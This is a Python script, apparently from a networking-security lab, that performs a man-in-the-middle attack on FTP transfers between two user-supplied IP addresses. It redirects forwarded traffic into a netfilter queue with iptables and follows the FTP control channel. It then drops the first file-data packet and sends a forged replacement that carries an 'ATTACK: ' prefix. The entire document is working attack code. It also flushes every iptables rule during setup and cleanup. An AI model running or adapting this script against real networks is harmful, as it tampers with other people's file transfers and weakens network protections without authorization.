from scapy.all import *
from netfilterqueue import NetfilterQueue
import re
import threading
import os
import signal
import sys
import subprocess

# Global state tracking with thread-safe lock
ftp_state = {
    'data_port': None,
    'filename': None,
    'client_data_port': None,
    'filename': None,
    'transfer_active': False,
    'modified': False,
    'waiting_for_150': False,
    'file_transfer_started': False,
    'file_content': b'',
    'last_seq': None,
    'client_ip': None,
    'server_ip': None,
    'server_control_port': 21,
    'client_control_port': None,
    'first_packet': True
}

lock = threading.Lock()

def get_nfqueue_pid():
    """Get PID of process using NFQUEUE 1"""
    try:
        output = subprocess.check_output("sudo cat /proc/net/netfilter/nfnetlink_queue", shell=True).decode()
        for line in output.split('\n'):
            if 'queue-num 1' in line:
                return int(line.split()[1])  # PID is the 2th column
    except Exception:
        return None
    return None

def cleanup():
    """Clean up iptables rules and any remaining processes"""
    print("\n[!] Performing cleanup...")
    
    # Get and kill NFQUEUE PID
    nfq_pid = get_nfqueue_pid()
    if nfq_pid:
        print(f"[+] Killing NFQUEUE process (PID: {nfq_pid})")
        os.system(f"sudo kill -9 {nfq_pid}")
    
    # Clean iptables
    os.system("sudo iptables -D FORWARD -j NFQUEUE --queue-num 1 2>/dev/null")
    os.system("sudo iptables -F 2>/dev/null")
    os.system("sudo iptables -X 2>/dev/null")
    
    print("[+] Cleanup complete. Exiting.")
    sys.exit(0)

def signal_handler(sig, frame):
    """Handle interrupt signals"""
    cleanup()

def get_user_input():
    """Prompt user for client and server IP addresses"""
    ftp_state['client_ip'] = input("Enter CLIENT IP address: ").strip()
    ftp_state['server_ip'] = input("Enter SERVER IP address: ").strip()
    print(f"\n[+] Monitoring FTP traffic between {ftp_state['client_ip']} (client) and {ftp_state['server_ip']} (server)")

def setup_iptables():
    """Set up specific iptables rules"""
    os.system("sudo iptables -F")
    os.system("sudo iptables -X")
    os.system(f"sudo iptables -I FORWARD -s {ftp_state['client_ip']} -d {ftp_state['server_ip']} -j NFQUEUE --queue-num 1")
    os.system(f"sudo iptables -I FORWARD -s {ftp_state['server_ip']} -d {ftp_state['client_ip']} -j NFQUEUE --queue-num 1")

def process_packet(packet):
    """Threaded packet processing function"""
    pkt = IP(packet.get_payload())
    
    try:
        with lock:
            # Filter for our specific FTP connection
            if not (pkt.haslayer(IP) and 
                   pkt[IP].src in [ftp_state['client_ip'], ftp_state['server_ip']] and 
                   pkt[IP].dst in [ftp_state['client_ip'], ftp_state['server_ip']]):
                packet.accept()
                return

            # Detect EPSV response
            if (pkt.haslayer(TCP) and pkt[TCP].sport == ftp_state['server_control_port'] 
                and pkt.haslayer(Raw)):
                
                raw_data = pkt[Raw].load.decode('utf-8', errors='ignore')
                
                if "229 Entering Extended Passive Mode" in raw_data:
                    match = re.search(r'\(\|\|\|(\d+)\|\)', raw_data)
                    if match:
                        ftp_state['data_port'] = int(match.group(1))
                        ftp_state['modified'] = False
                        # print(f"[+] Server data port: {ftp_state['data_port']}")

                elif "RETR " in raw_data:
                    ftp_state['filename'] = raw_data.split('RETR ')[1].strip()
                    print(f"[+] File transfer: {ftp_state['filename']}")

                elif "150 " in raw_data and not ftp_state.get('transfer_active', False):
                    print("[+] Server ready for transfer, intercepting file data")
                    ftp_state['transfer_active'] = True

            # Detect client data port
            if (pkt.haslayer(TCP) and (pkt[TCP].flags & 0x02) and
                pkt[TCP].dport == ftp_state.get('data_port')):
                
                if ftp_state['client_data_port'] is None:
                    ftp_state['client_data_port'] = pkt[TCP].sport
                    # print(f"[+] Client data port: {ftp_state['client_data_port']}")

            # Intercept data packets
            if (ftp_state['transfer_active'] and not ftp_state['modified'] and
                pkt.haslayer(TCP) and pkt.haslayer(Raw) and
                pkt[TCP].sport == ftp_state.get('data_port') and
                pkt[TCP].dport == ftp_state.get('client_data_port')):

                original = pkt[Raw].load
                # print(f"[+] Intercepted data packet ({len(original)} bytes)")
                
                # Modify and resend only first packet
                if ftp_state['first_packet']:
                    modified = b"ATTACK: " + original
                    modified_pkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / \
                                 TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                                     seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags='PA') / \
                                 modified
                    
                    send(modified_pkt, verbose=0)
                    print(f"[+] Original Data: {original}")
                    print(f"[+] Modified Data: {modified}")
                    print("[+] Injected successfully")
                    print("[*] Press Ctrl + C to terminate program....")
                    ftp_state['first_packet'] = False
                
                ftp_state['modified'] = True
                packet.drop()
                return

            packet.accept()
            
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        packet.accept()

def start_nfqueue():
    """Start the NFQUEUE with threading"""
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, process_packet)
    
    try:
        print("[*] Waiting for file transfer...")
        nfqueue.run()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"[!] NFQUEUE error: {e}")
    finally:
        nfqueue.unbind()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        get_user_input()
        setup_iptables()
        
        # Start packet processing in a separate thread
        nfqueue_thread = threading.Thread(target=start_nfqueue)
        nfqueue_thread.daemon = True
        nfqueue_thread.start()
        
        # Keep main thread alive
        while nfqueue_thread.is_alive():
            pass
            
    except KeyboardInterrupt:
        cleanup()
    except Exception as e:
        print(f"[!] Setup error: {e}")
        cleanup()
